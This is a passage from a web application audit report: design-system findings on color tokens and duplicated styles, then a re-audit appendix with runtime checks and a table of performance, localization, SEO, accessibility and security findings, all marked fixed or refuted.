- Recommendation: Add the existing 'dark' class to the dark-painted wrappers (AuthShell root div, the dashboard <aside>, mobile-nav bar + SheetContent, bulk-bar) so the already-tuned .dark tokens (--ring #5b9dff, --destructive #ef7d72, --gold-ink #e3c56a) apply, then replace 'text-red-200' with 'text-destructive'. Not a duplicate of A11Y-002 (scoped to the public dark canvas and remediated via the .dark token block) — this is a theme-scoping gap on different routes, evidenced by the red-200 workaround.
- Status: Verified

**[DS-704] No success/warning status tokens: studio status UI reaches for Tailwind default emerald/amber/red-200 hues outside the token layer**
- Scope: Studio
- Severity: Minor
- Effort: S
- Location: src/lib/scraper/health.ts:52-53,70-71; src/components/studio/scraper/scraper-kpis.tsx:69; src/components/studio/scraper/source-list.tsx:807; src/components/studio/auth-shell.tsx:70
- Observation: The token layer defines exactly one functional status color (--destructive, globals.css:47) so scraper health badges/dots use 'text-emerald-600/bg-emerald-500' and 'text-amber-600/bg-amber-500', the KPI strip uses 'text-emerald-500', the source toggle dot 'bg-emerald-500', and the auth error banner 'text-red-200' — five call sites of Tailwind default-palette hues with no CSS variable behind them.
- Impact: Success/warning semantics cannot be retuned or theme-varied centrally, and stock emerald/amber sit visually outside the restrained Midnight Sapphire + functional-crimson language the system documents.
- Recommendation: Extend the --destructive precedent ('functional only, never decorative') with '--success' and '--warning' variables in :root/.dark plus '@theme inline' color mappings, then replace the five ad-hoc classes (health.ts dot/className pairs, scraper-kpis tone, source-list dot; the red-200 case is fixed by the auth-island .dark fix). These are functional status tokens, not new brand hues, matching the existing --destructive convention. No prior finding (DS-001..010, P01-P37) touches status-color semantics.
- Status: Verified

**[DS-705] --electric used as flat hover text color on six auth links, violating its documented GLOW-ONLY role**
- Scope: Studio
- Severity: Minor
- Effort: S
- Location: src/app/studio/login/page.tsx:56; src/app/studio/signup/page.tsx:34,58; src/app/studio/forgot-password/page.tsx:32; src/app/studio/reset-password/page.tsx:26,47; src/app/globals.css:19
- Observation: globals.css:19 declares '--electric: neon-blue GLOW ONLY — never flat text/fill' (reinforced by the header comment at :8), yet all four auth pages style links 'text-azure hover:text-electric', a flat text fill whose hover shift is also nearly imperceptible (azure 5.45:1 → electric 5.09:1 on the glass-dark card, a darkening of ~7%).
- Impact: The token contract lies: the one rule the palette documentation states about electric is broken in six places, and the hover affordance it was chosen for barely registers.
- Recommendation: Replace 'hover:text-electric' with 'hover:text-porcelain' (the pattern the adjacent 'Forgot password?' link already uses at login/page.tsx:116) or an underline reveal; reserve electric for box-shadow/glow per its role. Distinct from UIUX-P01 (sapphire-as-text contrast, fixed via --sapphire-ink) — this is a token-role violation of a different token on different routes.
- Status: Verified

**[DS-706] Password-reset email re-hardcodes the brand palette, bypassing the lib/brand-colors.ts module created to prevent exactly this**
- Scope: Shared
- Severity: Minor
- Effort: S
- Location: src/lib/email.ts:118-125; src/lib/brand-colors.ts:1-27
- Observation: The email HTML template inlines #0a1a2f, #0f52ba (3x), #d4af37 and #44586f (3x) as raw style-string hexes, while brand-colors.ts — landed as the DS-006 fix — documents itself as the single source 'needed only where CSS variables can't reach — inline style strings'; email.ts imports nothing from it, and #44586f (the :root --muted-foreground value, globals.css:44) has no BRAND entry at all.
- Impact: A brand-blue or gold retune updates globals.css and BRAND but silently leaves the transactional email on the old palette, recreating the drift DS-006 was closed for.
- Recommendation: Interpolate BRAND.midnight/sapphire/gold into the template and add a 'mutedInk: "#44586f"' entry mirroring --muted-foreground to BRAND. New instance: DS-006's location list (dynamic-header, OG images, global-error) never included email.ts, and the remediation migrated only those files.
- Status: Verified

**[DS-707] Dead header-theme plumbing left behind by the DS-002 removal: unread data-header-theme stamps, an unreachable brand-logo ink rule, and a stale token comment**
- Scope: Public
- Severity: Polish
- Effort: S
- Location: src/components/layout/section.tsx:30; src/components/layout/footer.tsx:42; src/app/globals.css:54,318-320; src/components/layout/dynamic-header.tsx:159
- Observation: Section and the footer still emit data-header-theme="dark" on every band but no code reads the attribute anymore (dynamic-header.tsx contains no observer/selector for it after the DS-002 cleanup), the unlayered rule '[data-ink="dark"] .brand-logo { color: var(--sapphire) }' can never match because data-ink is hardcoded "light" (dynamic-header.tsx:159), and the globals.css:54 comment still claims header ink is 'swapped by DynamicHeader via [data-header-theme]'.
- Impact: Every page ships vestigial attributes and an unreachable CSS rule whose comments describe a mechanism that no longer exists, misleading the next developer who tries to theme the header per-section.
- Recommendation: Delete the data-header-theme attributes, the [data-ink="dark"] rule (or the data-ink attribute with it), and rewrite the globals.css:54-58 comment to say ink is fixed by the .dark token block. Not DS-002 itself (a required-but-ignored prop pre-fix): this is new residue introduced BY the post-July-12 fix, verifiable only at HEAD.
- Status: Verified

**[DS-708] The lowercase media-chip pill is a copy-pasted class string already drifting between components (porcelain/70 vs /80)**
- Scope: Public
- Severity: Polish
- Effort: S
- Location: src/components/portfolio/before-after.tsx:23; src/components/portfolio/portfolio-card.tsx:59; src/components/product/gallery.tsx:178,199
- Observation: before-after.tsx and portfolio-card.tsx repeat the identical chip recipe 'rounded-full bg-midnight/40 px-3 py-1 text-[11px] font-medium tracking-[0.18em] lowercase backdrop-blur-sm' but have already diverged on text alpha (text-porcelain/70 vs text-porcelain/80), while gallery.tsx re-expresses the same pattern at text-[10px]/tracking-[0.14em] — three hand-rolled variants of one overlay-chip treatment with no shared primitive or Badge variant.
- Impact: The signature image-overlay chip will keep drifting in size/alpha/tracking per file, the same accumulation pattern DS-008 showed in studio tables.
- Recommendation: Extract a shared MediaChip component (or a 'chip' Badge variant / @utility beside .eyebrow in globals.css) using the existing midnight/porcelain tokens and reuse it in all four call sites. Not DS-005 (.eyebrow clones, since fixed) or DS-008 (studio table headers): different pattern, public components, still live at HEAD.
- Status: Verified


---

# Appendix D — Step-5 Re-audit (2026-08-09, branch claude/resinriva-audit-tasks-tfz6cs)

Scope: this session's Step-3 tail (hreflang/sitemap/localeDetection I4, WhatsApp
localization + per-script fonts + footer theme toggle I5/T2) and Step-4 imagery
(S4), audited on top of the Appendix-C codebase. Method: 6-lens multi-agent
code sweep with adversarial verification of every Blocker/Critical/Major
candidate, plus the runtime verification below against a local production
build (`next start`, seeded Postgres).

## D.0 Ground-truth adjustment (master brief vs repo)

**ADJUSTED:** the master execution brief asserts the "real" design tokens are
`ivory #F4EFE9 / ink #14151D / ocean #0E3A53 / teal #1B6E7A / amber #C8881F /
gold #D4AF37` with a light-ivory default. The codebase at HEAD (and every doc
in-repo: CONTEXT.md §2, globals.css token block, 63 merged PRs of audit work)
implements the **Midnight Sapphire** system — `sapphire #0f52ba / azure
#3b82f6 / midnight #0a1a2f / deep-ocean #0e3a53 / void #0a0a0a / porcelain
#f8f9fa / ice #e3eef9 / gold #d4af37` — with a **dark default** and a
light-`:root` variant behind the T1 toggle. Only `#0E3A53` and gold overlap.
Per the brief's own hard constraints ("preserve the existing palette exactly",
"never contradict repo docs unless marked Adjusted"), the repo palette is
retained everywhere, including all Step-4 generation prompts. Evidence:
src/app/globals.css:1-60.

**ADJUSTED:** the brief's Section A wants the theme toggle in Studio too.
Studio is light-only by prior owner-approved architecture (CONTEXT.md; the
`.dark` token block is tuned for the public canvas, and ~20 admin screens were
contrast-audited under light). A studio dark theme is logged in the Phase-4
backlog (effort M-L), not silently shipped. Public toggle now exists in
header AND footer (T2).

## D.1 Runtime verification (local production build, 2026-08-09)

| Check | Result |
|---|---|
| HSTS / nosniff / CSP headers on `/` | **PASS** (CSP report-only per SEC-103 plan; img-src includes the Step-4 CDN host) |
| hreflang cluster on `/` — 9 locales + x-default, absolute URLs | **PASS** (React emits camelCase `hrefLang`; valid, attributes are case-insensitive) |
| Per-locale self-canonical (`/hi` → `/hi`) | **PASS** |
| `/hi` skip-link + chrome in Devanagari; Noto Devanagari `--font-script` class on `#rr-site-root` | **PASS** |
| `/hi` wa.me hrefs carry the Hindi greeting (URL-encoded Devanagari) | **PASS** |
| `/ar` `dir="rtl"` on site root + Arabic chrome | **PASS** |
| `sitemap.xml`: per-locale entries with `xhtml:link` reciprocal alternates, blog + `/hi/shop` present | **PASS** |
| `Accept-Language: hi` on `/` → 307 `/hi` (localeDetection) | **PASS** |
| `/blog` renders all 55 generated covers (allow-listed CDN through next/image) | **PASS** |
| Theme pre-paint script + `rr-theme` persistence markup present | **PASS** |
| `/studio` unauthenticated → redirect to login | **PASS** |
| Login lockout: 5 failed logins recorded per email+IP key in `RateLimitHit`, attempts 6-7 short-circuited unrecorded | **PASS** (Auth.js surfaces lockout as a failed-login 302, not a literal HTTP 429 — the durable-store exit criterion for SEC-102 holds) |
| Localized order message unit-proof: Hindi bilingual labels, 1500-char cap honored with notes-only truncation | **PASS** |

Higgsfield spend: 90 credits estimated, **70 actual** (1800 → 1730); 60/60
jobs completed (one rate-limited submission retried). Full inventory + prompt
list: docs/image-inventory.md.

## D.2 Lens findings (multi-agent sweep + adversarial verification)

13 agents (6 lenses, 7 verifiers), 1.08M tokens, 318 tool calls. Every
Blocker/Critical/Major candidate was adversarially verified against the real
build output/DB before acceptance; one Major (THEME-902, a hydration-order
hypothesis about the theme script) was **refuted** and dropped. All confirmed
findings were remediated in this session (commits carry the IDs).

| ID | Sev | Scope | Location | Finding | Status |
|---|---|---|---|---|---|
| PERF-310 | Critical | Shared | src/app/fonts.ts | next/font preloads per module graph, not per applied class — every page of every locale force-fetched ~450 KB of unused Noto woff2 at high priority (7 preload links verified in the build) | **Fixed** — `preload: false` on all five script faces |
| PERF-311 | Major | Shared | src/app/fonts.ts | ~200 KB raw / ~68 KB gz of Noto @font-face CSS attached to the ROOT layout chunk, render-blocking on every route including /studio (which needs none of it) — ~4× the entire app Tailwind CSS | **Fixed** — script faces split into fonts-scripts.ts, imported only by the [locale] layout |
| I18N-901 | Major | Public | src/app/layout.tsx:35 | `<html lang="en">` hardcoded for all 9 locale trees (and no `dir` — /ar document-level LTR): WCAG 3.1.1 fail, translate-prompt noise, AT mispronunciation of localized titles | **Mitigated** — pre-paint script mirrors lang/dir onto `<html>` before paint; structural per-route-group root layouts in backlog |
| IMG-901 | Major | Shared | prisma/seed-blogs.ts | Both cover seeds guarded on EMPTY covers only, but rows already hold the CDN URLs — the documented mirror→re-seed flip was a guaranteed no-op, stranding covers on the third-party CDN | **Fixed** — the generated CDN URL for a slug is machine-set/replaceable; owner-set covers still untouchable |
| I18N-902 | Minor | Public | src/actions/order.ts | Custom-commission Material/Occasion rows stayed raw English inside otherwise-bilingual messages | **Fixed** — bilingualLabel() + WhatsApp.material/occasion keys ×9 |
| I18N-903 | Minor | Public | [locale]/whatsapp-order/page.tsx | Recovery page fell back to the English greeting — the one localized-funnel branch that dropped the chain | **Fixed** |
| I18N-904 | Minor | Public | src/lib/whatsapp.ts | 1500-char cap ignored URL-encoding expansion (~9× for Indic/Arabic/CJK → ~13 KB wa.me URLs past Android in-app limits) | **Fixed** — dual cap (1500 chars AND 7000 encoded), binary-search notes truncation; hi binds at exactly 7000, en unchanged |
| A11Y-412 | Minor | Public | src/components/layout/footer.tsx | Footer ThemeToggle focus ring used the light-theme sapphire token: ~2.4:1 on the always-midnight band (< 3:1 non-text minimum) | **Fixed** — ring-azure (~4.7:1 both themes) |
| SEC-111 | Minor | Shared | next.config.ts | Host-only remotePatterns for the shared multi-tenant Higgsfield CDN let anyone proxy their uploads through this site's optimizer | **Fixed** — pinned to the studio's /user_…/ prefix (config + isOptimizableImageSrc) |
| IMG-902 | Minor | Public | [locale]/blog/page.tsx | Page-1 featured cover (likely LCP post-S4) was lazy-loaded, unpreloaded | **Fixed** — priority on the featured card only |
| IMG-903 | Minor | Studio | src/lib/import/validate.ts | isUrlish accepted any "/" value; with isRenderableSrc widened, junk relative paths from imports would render as broken tiles | **Fixed** — https?://, /uploads/, /images/ only |
| SEO-510 | Minor | Public | src/middleware.ts | next-intl's default Link header (query-dropping) contradicted per-page hreflang on /blog?page=N and annotated noindex routes | **Fixed** — alternateLinks: false |
| SEO-511 | Polish | Public | [locale]/search/page.tsx | Full hreflang cluster on a noindex route (ignored + Search Console noise) | **Fixed** — localized self-canonical only |
| SEO-512 | Polish | Public | [locale]/whatsapp-order/page.tsx | Layout baseline merged homepage hreflang into the recovery page's metadata; stale layout comment | **Fixed** — canonical-only + comment rewritten |
| THEME-902 | (Major) | — | [locale]/layout.tsx | Claimed server/client class-order hydration mismatch from cn() on the themed root | **Refuted** by verifier — not real, no change |

**Regression checks:** 15 previously-fixed findings re-verified at HEAD across
the lenses — SEO-001/002/008/503/508, UIUX-603, A11Y-002/005/009, DS-701,
UIUX-003, PERF-303, ENG-810, SEC-001, SEC-010 — all **Verified-Fixed**, none
regressed.

## D.3 Scorecard delta & remaining backlog

Zero Blocker/Critical/Major findings remain open: PERF-310/311, IMG-901 fixed
outright; I18N-901 mitigated to Minor-residual (structural fix backlogged).
The exit condition of the Step-6 loop is met. Minor/Polish residuals and
deferred items are ranked in audit-2026-07-implementation-plan.md → "Phase 5 backlog
(2026-08-09)".

